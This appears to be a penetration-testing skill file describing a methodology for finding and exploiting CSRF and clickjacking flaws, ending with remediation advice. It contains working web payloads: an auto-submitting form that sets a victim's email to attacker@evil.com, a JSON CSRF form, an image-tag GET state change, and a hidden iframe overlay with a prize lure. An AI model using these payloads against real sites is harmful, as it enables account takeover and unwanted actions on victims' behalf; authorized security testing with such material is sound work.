---
name: offensive-csrf
description: "Cross-Site Request Forgery and clickjacking testing. Covers token absence/validation flaws, SameSite cookie analysis, method/Content-Type bypasses, JSON CSRF, token-fixation, and UI-redress (clickjacking) via missing frame protections. Use when assessing state-changing requests and session handling."
---

# CSRF & Clickjacking — Offensive Testing Methodology

## Quick Workflow

1. Find state-changing requests (POST/PUT/DELETE; password/email/role change, transfers)
2. Remove/alter the CSRF token and replay — does it still succeed?
3. Test SameSite, Origin/Referer checks, method and Content-Type tolerance
4. Build a PoC HTML page; confirm cross-origin execution
5. Check framing protections for clickjacking

---

## Detection

### Token Tests

- Remove the token entirely → still works = no protection
- Use another user's / an old / an empty token → accepted = broken validation
- Token in body but not bound to session → token fixation
- Token only checked on POST, not on `?_method=` override

### Cookie / Transport Tests

- `SameSite=None`/absent + no token = exploitable cross-site
- `SameSite=Lax` blocks cross-site POST but **allows top-level GET** state changes
- Missing `Origin`/`Referer` validation

---

## Exploitation

### Auto-Submitting Form PoC

```html
<form action="https://target/account/email" method="POST" id="x">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('x').submit()</script>
```

### JSON CSRF

If the endpoint accepts `text/plain` or ignores Content-Type:

```html
<form action="https://target/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
```

### Method-Override / GET State Change

```
<img src="https://target/account/delete?id=42">
```

### Token Bypass Tricks

- Swap POST→GET if the framework routes both
- Strip the token param entirely
- Reuse a token captured from an unauthenticated page (if not session-bound)

---

## Clickjacking (UI Redress)

Test for missing `X-Frame-Options` / CSP `frame-ancestors`:

```html
<iframe src="https://target/account/delete" style="opacity:0.0001;position:absolute;z-index:2"></iframe>
<button style="position:absolute">Win a prize</button>
```

Drag-and-drop and input-overlay variants enable data theft/state change.

---

## Remediation

- Synchronizer or double-submit CSRF tokens, bound to the session, per request
- `SameSite=Lax` (or `Strict`) cookies; validate `Origin`/`Referer`
- Require correct Content-Type; reject `text/plain` for JSON APIs
- Send `X-Frame-Options: DENY` and CSP `frame-ancestors 'none'`
